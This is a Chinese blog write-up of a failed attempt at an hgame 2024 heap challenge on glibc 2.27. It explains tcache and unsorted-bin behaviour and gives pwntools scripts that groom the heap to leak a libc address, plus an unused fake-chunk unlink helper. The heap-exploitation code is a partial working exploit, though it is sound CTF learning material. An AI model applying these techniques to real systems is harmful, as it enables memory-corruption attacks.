---
date: 2024-2-23
tag:
  - tag
  - heap
---
# 记一次失败的UnsoretedBin 泄露libc（2024hgameWeek3 [1]）

- 什么都pwn只会害了你

> 2024 hgame的week3的一道题 libc版本2.27 虽然这个思路失败了 但是觉得还是学了东西 就记录下来

## 题目

- main函数

​		![main](https://awaqwqa.github.io/img/hgame/week3/off_by_one/main.png)

- add函数

  ![add](https://awaqwqa.github.io/img/hgame/week3/off_by_one/add.png)

- delete函数

  ![delete](https://awaqwqa.github.io/img/hgame/week3/off_by_one/delete.png)

- show函数

  ![show](https://awaqwqa.github.io/img/hgame/week3/off_by_one/show.png)

## 原理

- 首先libc版本为2.27 引入了`tcache`并且没有引入bk随机数安全检查机制
- `tcache bin`的范围为:`0x20-0x420`
- `tcache bin`单个区间大小的链表长度最长为7个

- 然后根据add函数的逻辑 我们一次性只能new一个0xff大小的chunk 显然不足以超过`tcache bin`的大小 所以我们得先填充满tcache

- `unsorted bin`是一个双向链表 

  - unsorted bin中第一个chunk的bk和最后一个chunk的fd都指向main_arena+48（32位）或main_arena+88（64位）的位置
  - 所以当unsortedbin只有一个chunk的时候那么fd和bk都指向了`main_arena+88`的位置
  - 我们先把unsorted bin大小的chunk申请下来 然后再free 让fd和bk填充进去 然后malloc要回来

## 实践

```python
from pwn import *
# r = process("./vuln")
r = gdb.debug("./vuln","b *main+33")
class FakeChunk:
    def __init__(self):
        self.prev_size = p64(0)
        self.size = p64(0)
        self.fd = p64(0)
        self.bk = p64(0)
        self.payload = b""
        self.next_chunk_prev_size = p64(0)
    def get_chunk_str(self):
        chunk = b""
        chunk += self.prev_size
        chunk += self.size
        chunk += self.fd
        chunk += self.bk
        chunk += self.payload
        return chunk
    # 构造fake chunk 只需要:fake chunk的size 以及指针原本的位置
    def set_chunk(self,size,ptr):
        self.prev_size = p64(0)
        self.size = p64(size +1)
        self.fd = p64(ptr-0x18)
        self.bk = p64(ptr-0x10)
        self.next_chunk_prev_size = p64(size)
        self.payload = (size - 32)*b"a" + self.next_chunk_prev_size
        print(f"构造的chunk:\n\tprev_size:0\n\tsize:{ size  }\n\tfd:{ hex(size +1) }\n\tbk:{ hex(ptr-0x10) }\n\tpatload长度:{ len(self.payload) }\n\t总长度:{ len(self.get_chunk_str()) }")

def waite_menu():
    print(r.recvuntil(b"Your choice:"))
def show(index):
    waite_menu()
    r.sendline(b"2")
    print(r.recvuntil(b"Index: "))
    r.sendline(str(index).encode())
def delete(index):
    waite_menu()
    r.sendline(b"3")
    print(r.recvuntil(b"Index: "))
    r.sendline(str(index).encode())
    print(f"------------------\n删除index为{ index }的chunk\n------------------")
def add(index,size,content):

    waite_menu()
    r.sendline(b"1")
    print(r.recvuntil(b"Index: "))
    r.sendline(str(index).encode())
    print(r.recvuntil(b"Size: "))
    r.sendline(str(size))
    print(r.recvuntil(b"Content: "))
    r.send(content)
    print(f"------------------\n添加index为{ index }的chunk\n------------------")

# fake_chunk = FakeChunk()
# fake_chunk.set_chunk(size=0xa8,)
for i in range(10):
    print("i :",i)
    add(i,0xa0,b"\x00")
for i in range(8):
    print("i :",i)
    delete(i)
for i in range(8):
    print("i :",i)
    add(i, 0xa0, b"\x00")
r.interactive()
```

- 先malloc 10个chunk(大于8个就行) 
  - 因为如果unsorted bin的chunk和`top chunk`相邻会被直接合并 所以我们需要一个`alloced chunk`挡在`top chunk`前

- 然后free 8个chunk 让`tcache bin`的位置填满 然后malloc 8个 让`tcache bin`先被消耗掉 
  - 因为当`tcache chunk`有大小合适的 chunk的时候 优先取 `tcache chunk`然后再去寻找`unsorted bin`

- 然后我发现一个状况 就是新获得`unsroted bin`中的chunk fd和bk都被清空了

  ![empty](https://awaqwqa.github.io/img/hgame/week3/off_by_one/unsortedBin.png)

- 并且通过测试发现只要是刚好要malloc的chunk大小如何符合 这个`unsortedbin`的chunk的大小就会被清空
- 所以尝试其他思路

### 修改思路

```python
from pwn import *
# r = process("./vuln")
r = gdb.debug("./vuln","b *main+33")
class FakeChunk:
    def __init__(self):
        self.prev_size = p64(0)
        self.size = p64(0)
        self.fd = p64(0)
        self.bk = p64(0)
        self.payload = b""
        self.next_chunk_prev_size = p64(0)
    def get_chunk_str(self):
        chunk = b""
        chunk += self.prev_size
        chunk += self.size
        chunk += self.fd
        chunk += self.bk
        chunk += self.payload
        return chunk
    # 构造fake chunk 只需要:fake chunk的size 以及指针原本的位置
    def set_chunk(self,size,ptr):
        self.prev_size = p64(0)
        self.size = p64(size +1)
        self.fd = p64(ptr-0x18)
        self.bk = p64(ptr-0x10)
        self.next_chunk_prev_size = p64(size)
        self.payload = (size - 32)*b"a" + self.next_chunk_prev_size
        print(f"构造的chunk:\n\tprev_size:0\n\tsize:{ size  }\n\tfd:{ hex(size +1) }\n\tbk:{ hex(ptr-0x10) }\n\tpatload长度:{ len(self.payload) }\n\t总长度:{ len(self.get_chunk_str()) }")

def waite_menu():
    print(r.recvuntil(b"Your choice:"))
def show(index):
    waite_menu()
    r.sendline(b"2")
    print(r.recvuntil(b"Index: "))
    r.sendline(str(index).encode())
def delete(index):
    waite_menu()
    r.sendline(b"3")
    print(r.recvuntil(b"Index: "))
    r.sendline(str(index).encode())
    print(f"------------------\n删除index为{ index }的chunk\n------------------")
def add(index,size,content):

    waite_menu()
    r.sendline(b"1")
    print(r.recvuntil(b"Index: "))
    r.sendline(str(index).encode())
    print(r.recvuntil(b"Size: "))
    r.sendline(str(size))
    print(r.recvuntil(b"Content: "))
    r.send(content)
    print(f"------------------\n添加index为{ index }的chunk\n------------------")

# fake_chunk = FakeChunk()
# fake_chunk.set_chunk(size=0xa8,)
for i in range(10):
    print("i :",i)
    add(i,0xa0,b"\x00")
for i in range(8):
    print("i :",i)
    delete(i)

add(0,0x90,b"\x00")
r.interactive()
```

- 然后修改思路 最后的malloc变为malloc一个更小的chunk 这样机制会优先去寻找`unsortedbin`来切割出一个更小的chunk

## 结果

> 最终让fd和bk写上了main_arean+88的地址了 但是我忽略了 在写入内容的时候最后加了一个0导致我们没办法读出来 内容被阶段了 (悲)
